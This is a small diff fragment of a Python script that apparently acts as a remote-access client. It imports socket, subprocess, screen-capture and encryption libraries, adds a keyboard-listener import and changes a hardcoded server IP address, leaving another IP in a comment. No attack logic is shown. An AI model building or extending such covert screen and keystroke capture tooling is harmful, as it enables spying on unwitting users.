@@ -1,7 +1,8 @@
 import socket, os, time, subprocess, mss, rsa
 from cryptography.fernet import Fernet 
+from pynput import keyboard
 
-address = ("138.197.218.142", 3000)
+address = ("0.0.0.0", 3000) # "45.61.136.109"
 authed = False
 
 
@@ -218,3 +219,5 @@ def main():
     close_connection(sock=server_con)
 
 main()
+
+
